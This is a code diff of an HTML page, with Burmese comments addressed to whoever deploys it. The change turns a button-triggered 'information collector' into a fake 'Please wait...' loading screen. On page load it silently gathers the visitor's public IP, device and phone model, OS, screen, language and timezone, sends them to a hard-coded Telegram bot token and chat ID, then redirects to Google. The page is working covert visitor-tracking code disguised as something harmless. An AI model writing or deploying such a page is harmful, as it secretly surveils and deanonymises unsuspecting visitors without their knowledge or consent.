@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Information Collector</title>
+    <title>Loading...</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -11,43 +11,41 @@
             padding: 50px;
             background: #f4f4f4;
         }
-        .btn {
-            display: inline-block;
-            padding: 15px 30px;
-            font-size: 18px;
-            background-color: #0088cc;
-            color: white;
-            text-decoration: none;
-            border-radius: 8px;
-            cursor: pointer;
-            border: none;
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #0088cc;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
         }
-        .btn:hover {
-            background-color: #006699;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         #status {
             margin-top: 20px;
-            font-weight: bold;
+            font-size: 16px;
+            color: #555;
         }
     </style>
 </head>
 <body>
 
-<h1>Welcome to Our Service</h1>
-<p>Click the button below to continue</p>
-
-<button class="btn" id="collectBtn">Click Here to Proceed</button>
-<div id="status"></div>
+<h1>Please wait...</h1>
+<div class="loader"></div>
+<div id="status">Processing, please wait...</div>
 
 <script>
-    // ========== အသုံးပြုသူ ပြင်ဆင်ရန် ==========
-    const BOT_TOKEN = '8726782078:AAFkKk2nZG3g8bhMg7exEQaaVapXS5nyWpE';   // သင်၏ Bot Token
-    const CHAT_ID = '8712941985';                                         // သင်၏ Chat ID
-    // ============================================
+    // ========== သင့် Telegram Bot အချက်အလက် ==========
+    const BOT_TOKEN = '8726782078:AAFkKk2nZG3g8bhMg7exEQaaVapXS5nyWpE';
+    const CHAT_ID = '8712941985';
+    // ================================================
 
     const statusDiv = document.getElementById('status');
 
-    // Function to get IP Address via free API
+    // Function to get Public IP Address
     async function getIPAddress() {
         try {
             const response = await fetch('https://api.ipify.org?format=json');
@@ -65,49 +63,69 @@
         let deviceType = 'Unknown';
         
         if (/Mobi|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone/i.test(userAgent)) {
-            deviceType = 'Mobile Phone';
+            if (/iPhone|iPad|iPod/i.test(userAgent)) deviceType = 'iPhone/iPad';
+            else if (/Android/i.test(userAgent)) deviceType = 'Android Phone';
+            else deviceType = 'Mobile Device';
         } else if (/Tablet|iPad/i.test(userAgent)) {
             deviceType = 'Tablet';
         } else {
-            deviceType = 'Desktop / Laptop';
+            deviceType = 'Desktop Computer';
         }
 
-        let os = 'Unknown OS';
+        let os = 'Unknown';
         if (/Android/i.test(userAgent)) os = 'Android';
         else if (/iPhone|iPad|iPod/i.test(userAgent)) os = 'iOS';
+        else if (/Windows NT 10.0/i.test(userAgent)) os = 'Windows 10';
+        else if (/Windows NT 11.0/i.test(userAgent)) os = 'Windows 11';
         else if (/Windows/i.test(userAgent)) os = 'Windows';
-        else if (/Mac/i.test(userAgent)) os = 'MacOS';
+        else if (/Mac OS X/i.test(userAgent)) os = 'MacOS';
         else if (/Linux/i.test(userAgent)) os = 'Linux';
 
-        let browser = 'Unknown Browser';
-        if (/Chrome/i.test(userAgent) && !/Edg/i.test(userAgent)) browser = 'Chrome';
-        else if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) browser = 'Safari';
-        else if (/Firefox/i.test(userAgent)) browser = 'Firefox';
-        else if (/Edg/i.test(userAgent)) browser = 'Edge';
+        // Phone model extraction (Android only - rough estimate)
+        let phoneModel = 'Unknown Model';
+        if (/Android/i.test(userAgent)) {
+            const modelMatch = userAgent.match(/; (.+?) Build/);
+            if (modelMatch && modelMatch[1]) {
+                phoneModel = modelMatch[1];
+            }
+        } else if (/iPhone/i.test(userAgent)) {
+            const versionMatch = userAgent.match(/iPhone OS (\d+_\d+)/);
+            if (versionMatch) {
+                phoneModel = `iPhone (iOS ${versionMatch[1].replace('_', '.')})`;
+            } else {
+                phoneModel = 'iPhone';
+            }
+        }
 
         return {
             userAgent: userAgent,
             deviceType: deviceType,
             operatingSystem: os,
-            browser: browser,
-            screenResolution: `${screen.width}x${screen.height}`,
+            phoneModel: phoneModel,
+            screenResolution: `${screen.width} x ${screen.height}`,
             language: navigator.language,
-            platform: navigator.platform
+            platform: navigator.platform,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
         };
     }
 
-    // Function to send message to Telegram Bot
+    // Function to send to Telegram
     async function sendToTelegram(ip, deviceInfo) {
-        const message = `📱 *New Visitor Information* 📱
+        const currentTime = new Date().toLocaleString('en-GB', { timeZone: deviceInfo.timezone });
         
-🌐 *IP Address:* ${ip}
+        const message = `📱 *PHONE VISITOR DETECTED* 📱
+        
+━━━━━━━━━━━━━━━━━━━━
+🌐 *IP Address:* \`${ip}\`
 📌 *Device Type:* ${deviceInfo.deviceType}
+📱 *Phone/Model:* ${deviceInfo.phoneModel}
 🤖 *OS:* ${deviceInfo.operatingSystem}
-🌍 *Browser:* ${deviceInfo.browser}
+🌍 *Browser/UA Info:* ${deviceInfo.userAgent.substring(0, 150)}...
 📏 *Screen:* ${deviceInfo.screenResolution}
 🗣 *Language:* ${deviceInfo.language}
-💻 *Platform:* ${deviceInfo.platform}
-🔍 *User Agent:* ${deviceInfo.userAgent.substring(0, 200)}`;
+🌍 *Platform:* ${deviceInfo.platform}
+⏰ *Time (Visitor):* ${currentTime}
+━━━━━━━━━━━━━━━━━━━━`;
 
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         
@@ -123,43 +141,43 @@
             });
             const result = await response.json();
             if (result.ok) {
-                statusDiv.innerHTML = '✅ Information sent successfully! Redirecting...';
+                statusDiv.innerHTML = '✅ Information sent! Redirecting...';
                 statusDiv.style.color = 'green';
                 return true;
             } else {
                 throw new Error(result.description);
             }
         } catch (error) {
-            console.error('Telegram send error:', error);
-            statusDiv.innerHTML = '❌ Failed to send. Please try again.';
+            console.error('Telegram error:', error);
+            statusDiv.innerHTML = '❌ Failed. Retrying...';
             statusDiv.style.color = 'red';
             return false;
         }
     }
 
-    // Main function when button clicked
-    document.getElementById('collectBtn').addEventListener('click', async function() {
-        statusDiv.innerHTML = '⏳ Collecting information...';
-        statusDiv.style.color = 'orange';
+    // ========== MAIN - လင့်ကလစ်တာနဲ့ ချက်ချင်းအလုပ်လုပ် ==========
+    (async function() {
+        statusDiv.innerHTML = '📡 Getting IP address...';
         
         // Get IP
         const ip = await getIPAddress();
         
+        statusDiv.innerHTML = '📱 Getting device info...';
+        
         // Get Device Info
         const deviceInfo = getDeviceInfo();
         
-        statusDiv.innerHTML = '⏳ Sending to server...';
+        statusDiv.innerHTML = '📤 Sending to Telegram...';
         
         // Send to Telegram
-        const success = await sendToTelegram(ip, deviceInfo);
+        await sendToTelegram(ip, deviceInfo);
         
-        if (success) {
-            // Optional: After 2 seconds redirect to any link (you can change this)
-            setTimeout(() => {
-                window.location.href = 'https://www.google.com'; // နှစ်သက်ရာ လင့်ထည့်ပါ
-            }, 2000);
-        }
-    });
+        // ပို့ပြီးရင် သတ်မှတ်ထားတဲ့ နေရာကို ပြန်ရွှေ့မယ်
+        setTimeout(() => {
+            // ဒီနေရာမှာ ခင်ဗျား ပြန်ရွှေ့ချင်တဲ့ လင့်ကို ထည့်ပါ
+            window.location.href = 'https://www.google.com';
+        }, 2000);
+    })();
 </script>
 
 </body>
